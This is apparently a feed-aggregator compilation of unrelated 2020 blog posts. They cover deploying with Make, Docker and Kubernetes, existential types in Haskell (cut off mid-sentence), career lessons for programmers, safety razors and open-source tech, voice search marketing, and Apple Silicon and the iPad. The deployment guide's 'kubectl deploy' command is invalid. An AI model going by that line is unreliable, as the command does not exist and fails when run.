<p>In this article I’m going to help you make the best, simplest, reproducible deployments possible.&nbsp; You may not know about ‘Make’, and if you mostly do .js or python it may feel a bit oldscool. But it’s actually very simple to use, and much more friendly than building your own ‘deploy.sh’ or ‘deploy.py’. Make will be the basis of what I show here.</p>



<p>In this guide I’m going to add the build steps one by one.</p>



<h3><strong>Step 1: Building your Dockerfile</strong></h3>



<p>I’ll assume this is nothing new to you. Instead I will just give you my two best tips:</p>



<ul><li>Docker has two build engines, the newer is called Docker Buildkit, and can be called with docker buildx build . it is <em>much smarter </em>for things like caching. Use it like so: <code>docker buildx build -t my_repo/project .</code></li><li>Do expensive installs before copying in your code, this will help Docker leverage the caching and be much faster. For web projects this means I’ll do:</li></ul>



<pre><code>FROM node:14

WORKDIR /app/
COPY package.json
RUN npm install
# and only then
COPY . . </code></pre>



<p>Ok, now we’re going to use <strong>Make</strong> to make our life easier. Just make a file named <code>makefile</code> and put in the following content:&nbsp;</p>



<pre><code>dockerize:
	docker buildx build -t my_repo/project .</code></pre>



<p>Now you can do <code>make dockerize</code> and it will save you a lot of typing! — We’re going to do more of that. Note I call it ‘dockerize’ because you may want to also ‘build’ for just a local building of the project.</p>







<h3><strong>Step 2 – Pushing it to the Docker Hub</strong></h3>



<p>Now we’ll also add a step in the Makefile to push it to the Docker hub, like so:</p>



<pre><code>image=my_repo/project

dockerize:
	docker buildx build -t $(image) .

push:
	docker push $(image)</code></pre>



<p>Notice that I’m introducing a variable here. image. If you define them at top of your Makefile they will be are available throughout your file.</p>



<p>Great! To make our life easier we can also chain commands like so:</p>



<pre><code>$ make dockerize push</code></pre>



<h3><strong>Step 3 – Deploying it</strong></h3>



<p>Now we’re going to deploy our freshly built and pushed image to our Kubernetes cluster. I’ll assume you have a deployment spec called deployment.yaml which contains something like:</p>



<pre><code>      containers:
        - name: cool-website
          image: my-repo/project</code></pre>



<p>And we add the following to our Makefile</p>



<pre><code>deployment: 
	kubectl deploy -f deployment.yaml

deploy: dockerize push deployment</code></pre>



<p>The deployment part is nothing new. But notice how with deploy we add the verbs after deploy? This is to trigger those things <em>first</em></p>



<p>So now we can type make deploy, and Make will do everything for us.</p>



<h3><strong>Step 4 – RE-deploying</strong></h3>



<p>Now, this is where it gets interesting. If you make changes to your code and run make deploy again you’ll notice a new image will be built and deployed, but your deployment will not be updated. This is because the <em>image name</em> didn’t change.&nbsp;</p>



<p>A (wrong)&nbsp; solution is to add ‘imagePullPolicy: always’ to your deployment. And this may actually work for you. But my experience is that it does not always work, and it’s really hard to see which version is running in production.</p>



<p>A better way is to add a version to your image!&nbsp;</p>



<p>Lets consider the following Makefile</p>



<pre><code>image=my_repo/project

dockerize:
	docker buildx build -t $(image):$(version) .

push:
	docker push $(image):$(version)

deployment:
	sed -e 's|:latest|:$(version)|g' deployment.yaml | kubectl apply -f -

deploy: dockerize push deployment</code></pre>



<p>Here we introduce a variable $(version), but instead of defining it in the Makefile you can just define it at runtime, like so:</p>



<pre><code>make deploy version=2</code></pre>



<p>A special note is to be given to the modification to the deployment step. What I do here is to use the Stream Editor ‘sed’ to find and replace the word :latest with the version you specify. So essentially we edit the file and then stream it straight into kubectl to deploy it.</p>



<p>For this to work you need to make sure you tag your image name in your deployment file as image: my-repo/project:latest&nbsp;</p>



<p>Try it! You can now easily deploy new versions.</p>



<h3><strong>Step 5 — Using git</strong></h3>



<p>As you are working on a project a little longer it’s nice to actually refer to a given version ‘running’ to code committed. And luckily ‘git’ allows for showing you which commit you are on. So lets add the following line to the top of our makefile:</p>



<pre><code>version := $(shell git describe --tags --always --abbrev=7 --dirty)</code></pre>



<p>What this line does is call out to the shell and run git describe, which returns information about the current git branch and commit you are on. –tags –always –abbrev=7 and –dirty help to format the returned string into something clear and usable.&nbsp;</p>



<p>&nbsp;If you use this you don’t need to specify the version, and can just type <code>make deploy</code>. Power tip: You can still use <code>version=22</code></p>



<h3>The complete Makefile</h3>



<pre><code>version := $(shell git describe --tags --always --abbrev=7 --dirty)
image=my_repo/project

dockerize:
	docker buildx build -t $(image):$(version) .

push:
	docker push $(image):$(version)

deployment:
	sed -e 's|:latest|:$(version)|g' deployment.yaml | kubectl apply -f -

deploy: dockerize push deployment</code></pre>

<![CDATA[Existential Haskell]]>

November 26, 2020 | https://blog.sumtypeofway.com/posts/existential-haskell.html | <a href="https://web.archive.org/web/*/https://blog.sumtypeofway.com/posts/existential-haskell.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <p>The majority of software engineering literature portrays object-oriented programming as distinct from, and often irreconcilable with, functional programming. This is, of course, a false dichotomy, as the techniques encouraged by functional programming are applicable in even the most object-oriented languages. Yet object-orientation, being perhaps history’s most popular software paradigm, has popularized its tenets, and occasionally we can see them show up even in programming languages like Haskell, a language about as antithetical to the object-oriented philosophy as possible.</p>
<p>In this piece, I’ll describe a common example of <a href="https://en.wikipedia.org/wiki/Information_hiding">information hiding</a> in ALGOL-style languages like Java, then express that in terms compatible with Haskell. We’ll then use this technique to port a <em>responder chain</em> to Haskell, demonstrating how Haskell supports dynamic function dispatch in the presence of hidden type information. I write this not because I expect to break any new ground—all the techniques I use here are long-documented in the literature, and Haskell veterans will probably find little new in this post<span><label for="sn-0"></label><span>Those familiar with the care and feeding of existential types may wish to skip to the penultimate section, which contains a couple useful data types that I haven’t yet seen in the wild.</span></span>—but because the existing resources are scattered, perhaps oddly so given how central dynamic dispatch is to most programming languages that aren’t Haskell, and because exploring the edge cases in the design illustrates the compromises inherent in language and library design.</p>

<p>Most of the world’s statically-typed programming languages allow their users to write code resembling the following Java:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>public</span> <span>static</span> <span>Comparable</span> <span>someFn</span>() {</span>
<span id="cb1-2">    <span>return</span> <span>"a concrete String value"</span>;</span>
<span id="cb1-3">}</span></code></pre></div>
<p>Syntactically, this code is uncontroversial: it’s a function that returns a value. Its only interesting aspect lies in the function signature−even though the function body returns a value of type <code>String</code>, its return type is declared to be <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/Comparable.html"><code>Comparable</code></a>, which is not a concrete data type, but a Java <a href="https://en.wikipedia.org/wiki/Interface_(computing)">interface</a>. As such, we cannot treat the result of this function call as the <code>String</code> it actually is; we can only interact with it via the methods defined on the <code>Comparable</code> interface. This application of the <a href="https://en.wikipedia.org/wiki/Rule_of_least_power">rule of least power</a> is a useful one, even in a strongly-typed language like Haskell: sometimes we want to hide the implementation details of a function’s return type.</p>
<p>We can try to write the same thing in Haskell:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>someComparableValue ::</span> <span>Ord</span> a <span>=&gt;</span> a</span>
<span id="cb2-2">someComparableValue _ <span>=</span> <span>"a concrete string value"</span></span></code></pre></div>
<p>Because this is not semantically-valid Haskell, we get the following error:</p>
<pre><code>&lt;interactive&gt;:3:27: error:
    • Couldn't match expected type ‘a’ with actual type ‘[Char]’
      ‘a’ is a rigid type variable bound by
        the type signature for:
          someComparableValue :: forall a. Ord a =&gt; Int -&gt; a
</code></pre>
<p>Haskell’s typechecker looks at the body of this function and says “hey, man, you’re returning a concrete string value here, not ’any type that is <code>Ord</code>–erable.’” Though this is a valid notion in Java, it’s not valid in Haskell. Another perspective on this is that Java allows a value to have more than one type: we can treat a Java string literal as a value of type <code>java.lang.String</code>, or of type<span><label for="sn-1"></label><span>even though <code>Comparable</code> is an interface, not a concrete type</span></span> <code>Comparable</code>, or of its superclass <code>java.lang.Object</code>. However, since Haskell doesn’t support inheritance, Haskell treats its values as having one, and only one, type. Working around this takes a judicious application of an existential type.</p>

<p>In Haskell, an <em>existential</em> data type is one that is defined in terms not of a concrete type, but in terms of a quantified type variable, introduced on the right-hand side of the data declaration. This is, as is the case for so many Haskell concepts, not a particularly helpful definition in the abstract. It’s easier to show than to tell, so let’s take a look at one of the canonical examples of an existential type: a <code>Showable</code> type that wraps any type that implements the <code>Show</code> interface.</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>data</span> <span>Showable</span> <span>=</span> <span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> <span>Showable</span> a</span></code></pre></div>
<p>There are several interesting things about this data type. Firstly, it uses the <code>forall</code> keyword to introduce the <code>a</code> type variable: given that we’re dealing with <em>exist</em>-ential types, it threw me for a loop that there wasn’t an <code>exists</code> keyword.<span><label for="sn-2"></label><span>Scala reserves a <code>forSome</code> keyword for this purpose, which I think reads a little more accurately in terms of the intent of introducing this type variable: using the phrase “for all” is a bit inapposite given that the <code>Showable</code> constructor is applied to single values at a time.</span></span> Considering the constructor of <code>Showable</code> is perhaps more enlightening:</p>
<div id="cb5"><pre><code><span id="cb5-1">λ<span>&gt;</span> <span>:</span>t <span>Showable</span></span>
<span id="cb5-2"><span>Showable</span><span> ::</span> <span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> a <span>-&gt;</span> <span>Showable</span></span></code></pre></div>
<p>We can read this as “<code>Showable</code> is a constructor that takes, for all types <code>a</code> such that <code>a</code> implements <code>Show</code>, an <code>a</code> value, and returns a value of type <code>Showable</code>, the internal <code>a</code> value of which is no longer visible to the world once it’s been applied.”</p>
<p>Secondly, we can’t use a <code>newtype</code> to declare an existential. Attempting to write the following:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>newtype</span> <span>Showable</span> <span>=</span> <span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> <span>Showable</span> a</span></code></pre></div>
<p>results in an error message:</p>
<pre><code>• A newtype constructor cannot have a context in its type
  Showable :: forall a. Show a =&gt; a -&gt; Showable
• In the definition of data constructor ‘Showable’
  In the newtype declaration for ‘Showable’
</code></pre>
<p>When we consider typeclasses as <a href="https://blog.sumtypeofway.com/posts/fluent-polymorphism-type-applications.html">dictionaries</a>, this restriction makes more sense: in GHC Core, this <code>Show a</code> constraint will be represented as a hypothetical <code>ShowDict</code> data type containing implementations for the <code>show</code>, <code>showsPrec</code>, and <code>showList</code> functions. In this light, we can see that <code>Showable</code> takes <em>two</em> parameters, not one: an <code>a</code> value to wrap, as well as the <code>ShowDict</code> dictionary associated with that value’s type. Newtypes exist to wrap single values, and here we’re wrapping both a datum and its associated <code>Show</code> dictionary: as a result, here we need a <code>data</code> declaration, even though the associated <code>Showable</code> constructor takes only one value (in Haskell surface syntax). This is an understandable limitation, though it would be cool if existential values of this sort could opt into the <code>deriving</code> mechanism in the manner of newtypes.</p>
<p>A third interesting thing: we can’t write a function that unwraps this data type. What might seem like an intuitive type for the function is rejected:</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>-- GHC will reject this.</span></span>
<span id="cb8-2"><span>unwrapShowable ::</span> <span>Showable</span> <span>-&gt;</span> (<span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> a)</span>
<span id="cb8-3">unwrapShowable (<span>Showable</span> a) <span>=</span> a</span></code></pre></div>
<p>We can see this explained a little more closely if we use the record selector syntax.</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>data</span> <span>Showable</span> <span>=</span> <span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> <span>Showable</span> {<span> getShowable ::</span> a }</span></code></pre></div>
<p>Attempting to use <code>getShowable</code> as a function that extracts some arbitrary <code>Show</code>–inhabiting type produces a well-explained error messages:</p>
<pre><code>&lt;interactive&gt;:1:1: error:
    • Cannot use record selector ‘getShowable’ as a function due to escaped type variables
      Probable fix: use pattern-matching syntax instead
    • In the expression: getShowable
</code></pre>
<p>The mental model I use here is that applying a constructor of an existential type serves as a sort of <a href="https://en.wikipedia.org/wiki/Event_horizon">event horizon</a> for type information. In other languages we can assemble heterogenous lists natively; in Haskell, by contrast, we have to opt into it explicitly: applying the <code>Showable</code> constructor to a value swallows its type information. We can’t write a function, whether the hand-written <code>unwrapShowable</code> or descending from our <code>getShowable</code> record selector, that unwraps some arbitrary type out of an existential. All that is retained is the ability, given a proper <code>case</code> statement to unwrap the value within the existential, to <code>Show</code> the value contained therein: it cannot <em>escape</em> its scope, as the error message above explains<span><label for="sn-3"></label><span>We can, however, use the <code>getShowable</code> record selector to update the wrapped value present in a <code>Showable</code>.</span></span>.</p>
<p>We can, as I mentioned above, cross the event horizon with a <code>case</code> statement, binding the <code>Show</code>–conforming contents to a variable name:</p>
<div id="cb11"><pre><code><span id="cb11-1"><span>let</span> shown <span>=</span> <span>case</span> x <span>of</span> <span>Showable</span> val <span>-&gt;</span> <span>show</span> val</span></code></pre></div>
<p>Inside the right-hand-side of this <code>case</code> statement, we have a value <code>x</code> in scope. A quick inquiry with type holes reveals the type we expect:</p>
<pre><code>• Relevant bindings include
    x :: a (bound at &lt;interactive&gt;:28:15)
  Constraints include Show a (from &lt;interactive&gt;:28:11-15)
</code></pre>
<p>All we know about this value <code>x</code> is that we can call <code>Show</code> on it. Other than passing it to the basic combinators (<code>id</code> and <code>const</code>), that’s <em>all we can do</em> with this value. Any bit of type information has been lost, replaced instead with <em>capabilities</em>, via typeclasses. Again, when we consider typeclasses as dictionary parameters, we can visualize how this works on a core-calculus level: we discard type information, including only the relevant dictionaries provided by the context of the <code>forall</code>.</p>
<p>A fourth and final interesting thing about this type is that you can write it, using the <code>GADTs</code> GHC extension, without an explicit <code>forall</code> keyword:</p>
<div id="cb13"><pre><code><span id="cb13-1"><span>data</span> <span>Showable</span> <span>where</span></span>
<span id="cb13-2">  <span>Showable</span><span> ::</span> <span>Show</span> a <span>=&gt;</span> a <span>-&gt;</span> <span>Showable</span></span></code></pre></div>
<p>This stems from the fact that GADTs allow us to introduce per-constructor type variables and associated constraints, even if the type variable is not visible externally. Another thing to note is that data declarations containing existential values don’t have to be limited to a single value: they can hold concrete values, or values expressed with more <code>forall</code>–introduced type variables.</p>

<p>Being able to hide implementation details of a function’s return type is all well and good, but many users are going to need to convert (or attempt to convert) from an existential type back into a concrete type. Java provides this functionality with the <code>instanceof</code> operator and its cast syntax:</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>Comparable</span> c = <span>someFn</span>();</span>
<span id="cb14-2"><span>if</span> c <span>instanceof</span> <span>String</span> {</span>
<span id="cb14-3">    <span>System</span>.<span>out</span>.<span>println</span>(<span>"Got a string: "</span> + (<span>String</span>)c);</span>
<span id="cb14-4">} <span>else</span> {</span>
<span id="cb14-5">    <span>System</span>.<span>out</span>.<span>println</span>(<span>"Casting to a String here would raise a ClassCastException"</span>);</span>
<span id="cb14-6">}</span></code></pre></div>
<p>This is a consequence of all Java objects descending from <code>java.lang.Object</code>, and the ability of the <code>instanceof</code> operator to query the type of an object at runtime. Though …</p></section></div>

<p><strong>Programming is not about coding, programming is about solving problems with coding.</strong></p>
<p>End customers don’t care what technologies, languages, frameworks, or methodologies you use. They care only about one thing, whether your product solves their problem or not.</p>
<p>That’s why no one cares what technologies Google search is using under the hood. Until people can find relative information with it, they will use it.</p>
<p>It’s the number one thing I wish I knew when I started programming.</p>
<p>I would spend less time writing “best code” and more time solving customer’s problems best.</p>
<p><strong>Don’t write code just to write code, solve customer’s problems with the code.</strong></p>
<h2 id="communication-skills-more-important-than-coding-skills">Communication Skills More Important Than Coding Skills</h2>
<p>When I just started my career, lack of social skills was not my main problem. But when I moved higher, to the middle, senior, and leadership position, my weak soft skills became my Achilles heel.</p>
<p>When you work on a product with a group of different people (engineers, designers, managers), communication is the only thing that makes you a “team” and helps you effectively develop the product.</p>
<p>Lack of social skills does the opposite, it decreases the product development time and overall productivity.</p>
<p>Here is the real situation you might face:</p>
<p>The leadership team tells your product manager that they want to create a new product feature and put it in the next product release. It’s not urgent, they just want to release it as soon as possible (as always).</p>
<p>The product Manager calls you on Zoom, tells you what you need to build, and asks, <em>“How much time do you need to build it?”</em></p>
<p>You are doing a rough calculation and tell, <em>“I need 20 hours.”</em></p>
<p>The Product Manager is not satisfied with your answer. He wants to release it as soon as possible and show the management that he can deliver results fast (this is a very common situation).</p>
<p>So he asks you, <em>“Can you build it for 10 hours? We really need this feature in the next product release!”</em></p>
<p>And you know that you can if you cut the corners (no tests, messy code) but then you will need to refactor it, and it will take an additional 30 hours. Because other engineers will work with your messy code when you release it. And after refactoring, you will need to integrate their code with yours.</p>
<p>So here’s what will happen next. If you have bad social skills, you will not convince the Product Manager that you actually need 20 hours to build this feature. </p>
<p>Why?</p>
<p>Product Managers often have good social skills, from my experience. So if you can’t convince him that refactoring later is worse than spending 20 hours right now, he will easily argue with you and convince you that “refactoring later is okay.” And the whole team will lose additional 30 hours for this refactoring (I don't count the time to fix unpredictable bugs after).</p>
<p>But if you have good communication skills you will be able to convince him of the opposite.</p>
<p><strong>So improve your social skills as well as coding skills</strong> (send memes in the group chats on Slack or something).</p>
<p>And remember one simple truth:</p>
<p><strong>People work with people, not machines.</strong></p>
<h2 id="regular-breaks-help-to-program-better">Regular Breaks Help To Program Better</h2>
<p>For 4 years I always feel exhausted after work. Somehow I could productively work only for a couple of hours. After that, I didn't have much energy. Until I learned about the Pomodoro technique.</p>
<p>It’s quite simple. You work for 25 minutes and take a break for 5 minutes.</p>
<p>Your working routine becomes:</p>
<p>8:00-8:25 – Work</p>
<p>8:25-8:30 – Break</p>
<p>8:30-8:55 – Work</p>
<p>8:55-9:00 – Break</p>
<p>…</p>
<p>I tried it for a week and was surprised at how focused, energetic, and productive I became  (<a target="_blank" href="https://www.focusboosterapp.com/blog/the-science-behind-the-pomodoro-technique/">the science behind Pomodoro</a>)</p>
<p>Then I went further and implemented the <a target="_blank" href="https://twitter.com/nickbulljs/status/1303037682294173699">52+17 system</a> and my productivity levels spiked by 200%.</p>
<p><strong>So</strong> <strong>take regular breaks if you want to operate at your maximum capabilities.</strong></p>
<h2 id="10x-engineers-dont-exist">10X Engineers Don’t Exist</h2>
<p>At the beginning of my career, I thought that a great programmer is a person who knows tons of programming languages, frameworks, and methodologies.</p>
<p><strong>I was wrong.</strong></p>
<p>Such a mindset only gave birth to my impostor syndrome. I thought that I don't deserve my current position, my salary, that I am a “fraud.” So I started to follow every popular developer on Twitter, read every technical news, and thousands of developer blogs just to convince myself that I deserve what I have and to feel more close to the title “great developer.”</p>
<p><strong>This was not a healthy behavior.</strong></p>
<p>But it helped me to discover that a lot of people I followed (I thought were 10X engineers) actually didn’t know a lot of things. They may know how to do some complex things that require a lot of different deep knowledge in a couple of fields and at the same time don’t know some primitive things. Like to know how to design highly scalable database architectures but don’t know how vertical-align an element with CSS.</p>
<p>Big thanks to those developers, like Dan Abramov (creator of Redux) for <a target="_blank" href="https://overreacted.io/things-i-dont-know-as-of-2018/">this article</a>, they cured my imposter syndrome and showed me that it is okay not to know something.</p>
<h2 id="programming-is-not-hard-if-you-know-how-to-learn">Programming Is Not Hard If You Know How To Learn</h2>
<p>When I started to learn JavaScript, it was hard. <strong>Because I learned the wrong way.</strong></p>
<p>Read a lot of theory without the practice, no routine, no end goal. Chaos.</p>
<p>I thought it was normal to learn like this. Until I discovered <strong>deliberate practice.</strong></p>
<p>It’s a purposeful and systematic type of practice (learning).</p>
<p>The difference between normal practice and deliberate is that deliberate requires focused attention and is conducted with the specific goal of improving performance.</p>
<p>After I applied a deliberate practice, I began to notice how fast I'm progressing with learning JavaScript. My knowledge started to stick for a long time, not just for 5 minutes after tutorials. I created the end goal, why I am learning JavaScript, and understand what I need to learn, and what I don't.</p>
<p>📌 <em>Quick note: I’m creating a JavaScript course where I’m using deliberate practice to <strong>combine modern and practical JavaScript theory with a lot of real-world practice</strong> to teach you how to become a skilled JavaScript developer with knowledge of modern language features. <a target="_blank" href="https://javascriptcoursethatworks.com/">Join here.</a></em></p>
<p>So here is what you need to perform deliberate practice on your own:</p>
<ol>
<li><strong>Teacher:</strong> provides practice activities designed to help you improve performance.</li>
<li><strong>Perform at maximum effort:</strong> constantly being taken out of your comfort zone.</li>
<li><strong>Well defined and specific goals:</strong> not just “overall improvement.”</li>
<li><strong>To be in focus:</strong> give your full attention, no distractions.</li>
<li><strong>Do conscious actions:</strong> no autopilot.</li>
<li><strong>Instant response to feedback and modifying your strategy.</strong></li>
</ol>
<p>When you start learning a new language, technology, framework, whatever, stick to these rules to get big results as quickly as possible.</p>
<h2 id="there-is-no-best-programming-language">There is no “best programming language”</h2>
<p>There is no <strong>best "something"</strong> in our world. Only <strong>best in something</strong>.</p>
<p>Let’s take cars. How can we choose the best car in the world? By speed? By safety? By what criteria?</p>
<p>It’s impossible.</p>
<p>We can only choose the best car in a certain category. Like the safest car. Or the best offroad car.</p>
<p>And if we look deeper, every category solves some problems.</p>
<p>For example.</p>
<p><strong>Problem:</strong> We have children and we take them to school every day, we want our children to be safe on the way to school.</p>
<p><strong>Solution:</strong> Buy the safest car.</p>
<p><strong>Problem:</strong> We go camping every weekend, so we need some vehicle that can easily get us to places that are difficult to access.</p>
<p><strong>Solution:</strong> Buy the best off-road car.</p>
<p>The same is with programming languages. Some languages and tools are better at solving some problems than others.</p>
<p>If we want to build an interactive website, we choose JavaScript.</p>
<p>If we want to go with ML/AI, we choose Python.</p>
<p>Remember, <strong>there is no best programming language, there is the best programming language to ...</strong></p>
<p>So start with a problem first, then pick a language to solve it.</p>

November 26, 2020 | https://michel-slm.name/post/2020-11-23-on-safety-razors-and-tech/ | <a href="https://web.archive.org/web/*/https://michel-slm.name/post/2020-11-23-on-safety-razors-and-tech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><img src="https://michel-slm.name/img/rex_ambassador.webp" alt="rex-ambassador"></p>
<h2 id="on-safety-razors">On safety razors</h2>
<p>I recently switched over from the ubiquitous cartridge razors to double-edge safety razors. The original impetus was not finding a non-charging base for my GiletteLabs Heated Razors - the battery in the stem made it too wide for most razor holders - and noticing that a lot of reviews swear by various safety razors.</p>
<p>I ended up buying the 
<a href="https://www.razoremporium.com/rex-supply-co-ambassador-adjustable-stainless-steel-de-razor/" target="_blank" rel="noopener">Rex Ambassador</a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> a few months ago - and then held off on actually using it, telling myself I need to learn how to properly use it first. In the end I told myself I would stop using my Gilette the day after the US Presidential Election, and start using the safety razor the morning after the US Presidential Election is finally called – which was Sunday the 8th, with a nice 5-day stubble to test it on.</p>
<p>The first shave went surprisingly smoothly; the next few shaves ended with some minor mishaps - cockiness and distraction getting in the way - but overall there is no way I’m going back to cartridge razors after this. Feeling more in control, getting a closer shave, no plastic waste to dispose – and hey much lower total cost of ownership!</p>
<h2 id="-and-technology">… and technology</h2>
<p>There seems to be a parallel here between the world of personal care and that of technology:</p>
<ul>
<li>most people are trapped on proprietary, heavily marketed solutions (cartridge razors, proprietary operating systems, apps and services)</li>
<li>these proprietary solutions are at first glance more user friendly</li>
<li>the more open solutions have a steeper learning curve but are eventually more empowering</li>
<li>vendor lock-in</li>
<li>the incentives for the manufacturers/vendors and customers/users are not aligned</li>
</ul>
<p>Think Windows on one side, vs Linux (and the BSDs) on the other (with macOS initially being in the middle and increasingly swaying to becoming even more constraining than Windows). Think proprietary gaming consoles and mobile IAP-chasing games, vs game platforms that 
<a href="https://fennel-lang.org/setup#making-games-with-fennel" target="_blank" rel="noopener">encourage participation</a> like 
<a href="https://tic80.com/" target="_blank" rel="noopener">TIC-80</a> and 
<a href="https://love2d.org/" target="_blank" rel="noopener">LÖVE</a>. Think US-centric proprietary social networks (Facebook, Twitter) and services (Dropbox, Google Suite) vs distributed social networks (Mastodon, Pleroma, Diaspora etc.) and self-hosted services (Nextcloud, Cryptpad etc.).</p>
<p>What are most people sacrificing to the altar of promised convenience? Literally both time and money: our attention, higher costs; also our autonomy (you’re locked in) and our privacy (… so platform owners can mine your attention and monetize what they observe of your behavior).</p>
<p>If you believe in capitalism, this is bad news. If you don’t it’s even worse.</p>
<h2 id="so-what-can-we-do">So what can we do?</h2>
<p>Part of the solution is regulatory. In the EU, 
<a href="https://nextcloud.com/blog/eu-court-withdraw-personal-data-of-eu-citizens-from-us-cloud-services-immediately/" target="_blank" rel="noopener">a recent ECJ ruling</a> requires EU companies to stop using US-based cloud services to host data from EU citizens. This could help push the adoption of more open, user-empowering, privacy-friendly alternatives.</p>
<p>But in other jurisdictions like the US, regulation might be a long time coming, except maybe in California (plus the companies we’re trying to unshackle users from are mostly US-based). So a lot of the solution has to be bottom up.</p>
<p>We simply need to lower barriers to entry, both actual and perceived, to using the platforms we’re championing. Some involve compromises (e.g. 
<a href="https://flatpak.org/" target="_blank" rel="noopener">Flatpak</a> is a great way to abstract away the differences between Linux distributions, to the point that 
<a href="https://flathub.org/home" target="_blank" rel="noopener">it’s easier to install proprietary apps</a>, including Steam – which improves the availability of games on Linux despite, yes, being proprietary). Some involve corporate backing (e.g. 
<a href="https://fedoramagazine.org/lenovo-fedora-now-available/" target="_blank" rel="noopener">Fedora on Lenovo laptops</a>). A lot would involve being more welcoming to newcomers, and bridging the actual usability gaps there are.</p>
<p>It’s hard enough to overcome incumbency and the network effect. Let’s not make it harder for ourselves.</p>

November 26, 2020 | https://www.speechly.com/blog/voice-search/ | <a href="https://web.archive.org/web/*/https://www.speechly.com/blog/voice-search/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Voice search or voice-enabled search is the means of searching by using the most natural input channel, human speech.</p><p><strong>TL;DR You can find a demo of voice search done right in the bottom of this article</strong></p><p><a href="https://www.thinkwithgoogle.com/marketing-strategies/app-and-mobile/voice-search-statistics/">20% of all Google App searches</a> are done by using voice and a nearly 40% of US internet users are using voice search features.</p><p>According to PwC research from 2018, consumers actually prefer voice over typing for searching. And this is no wonder: typing on a smart phone is not the nicest of tasks and more and more people are using internet primarily on a mobile device.</p><h2>Voice search is not available on most applications</h2><p>But when it comes to applications and websites, voice search is still rarely available. Why is that?</p><p>We did some small research on developer communities and found out that the <strong>number one reason for not adopting voice search</strong> is the lack of developer tools for doing that.</p><p>Search is a very valuable part of many applications and designers and developer teams use a lot of time to make it just right for the users. Users who search can be over three times more probable to convert than those who don't search.</p><blockquote><p>Developer tools for building voice search haven't previously been available</p></blockquote><p>This means getting users to search and most importantly to find what they are looking for is of immense value to any product team.</p><p>Smart speakers can help here: according to ComScore, half of online shoppers are using voice assistants to help them research products.</p><p>But like we've written many times, smart speakers and voice assistants are not the <a href="https://www.speechly.com/blog/why-smart-speakers-are-not-the-future-of-voice/">holy grail of voice</a>. Actually far from it. Voice needs to be a part of applications to be really relevant.</p><h2>Differences of voice search and traditional search</h2><p>Voice search is not just regular search box that has a microphone button and a speech-to-text system. This approach would lead into a bad user experience and this is not how Google is doing it, either.</p><p>In fact, the reason why a lot of searches on Google are done by using voice is that they have developed their natural language understanding capabilities. If you are looking for population of the USA, you can just ask "What's the population of United States" and you'll get your answer.</p><p>We search differently by using voice and by typing. For example, voice searches are typically longer than their written counterparts and they are expressed in natural language.</p><div><div><div><p>Sign up and learn how voice search can improve your key metrics</p></div></div></div><p>This has clear implications for voice search. While typing "Intel LGA1151 motherboards" to a search bar is a natural way for doing search by typing, uttering that out loud might prove difficult and probably saying something like "motherboards for new intel processors" might be a better way of expressing the same search by using voice.</p><p>While regular search can give valuable information on how the voice search should be implemented, it needs to be designed separately.</p><h2>How to do voice search right</h2><p>To get voice search right, it needs to support natural language. The experience must be natural and it should be as tightly integrated to the current user experience as possible. You don't want to add a voice assistant or a chatbot with a totally different user experience, but to complement your current search.</p><p>Speechly is the first developer tool that enables developers to add natural, real-time voice experience to their applications in a short amount of time.</p><p>Voice search done by using Speechly works on all platforms with a single configuration for consistent user experience, enables corrections by using speech and is easily integrated to the current user interface with minimal changes.</p><p>Here's a demo showing voice search done right. It supports natural language, long or short queries and updates in real-time to encourage user to go on with the voice experience or to enable them to correct themselves quickly.</p><h2>Voice search demo</h2><p>Speechly supports <a href="https://docs.speechly.com/client-libraries/ios/">iOS</a>, <a href="https://docs.speechly.com/client-libraries/android/">Android</a>, <a href="https://docs.speechly.com/client-libraries/react/">React</a> and <a href="https://docs.speechly.com/client-libraries/react-native/">React Native</a> platforms. You can find tutorials for each platform in our documentation.</p><p>If you are interested in adding voice search to your website or mobile application, <a href="https://www.speechly.com/get-started/">contact us</a> to learn more!</p></div></div></div></div>]]>

<p>Hear that? It’s the sound of Mac fans. No, not your shiny new M1 Mac’s fans—chances are, you’ll never hear those—but rather, the sound of <em>excitement</em> rippling through the Mac community. This is something big. Really big. Now, I’m only 33, but someday when I go full fuddy-duddy I will speak of this: the great Intel/Apple Silicon transition. The beginning of a new era at Apple.</p>



<p>All that sounds dramatic, of course, but it’s interesting to trace all of the different paths that led us to this point. The A-Series chips, the introduction of Metal, rapid machine learning gains, the gradually degrading repairability scores as components became more integrated, the Secure Enclave, a new super fast emulation layer, new unified memory architecture, and 5nm process… years and years of work have now come to fruition with the first Apple Silicon chips for Mac. And our minds are blown.</p>



<p>Suddenly, we’re handed a thin, entry-level fanless laptop that performs better than almost every other Mac computer out there, and a low-end MacBook Pro and Mac Mini that make current Mac Pro owners sweat and clutch their wheels. So many questions abound. What new hardware designs will these gains make possible? What on earth does Apple have in store for its high-end Macs? Will anyone else even be able to compete? It’s an exciting time to be a Mac lover, but, surprise: this post isn’t really about the Mac. It’s about the iPad.</p>



<p>There’s no question that Apple has struggled to craft a cohesive, compelling narrative for the iPad. For a long time, there seemed to be a distinct lack of product vision. Everyone likes to speculate over what role Steve Jobs ultimately intended the iPad to have in people’s lives, but not only is that pointless, it’s also irrelevant. We don’t need Steve to tell us what the iPad is good for. We know what it’s good for, and we can easily imagine what it <em>could</em> be good for, if only Apple would set it free.</p>



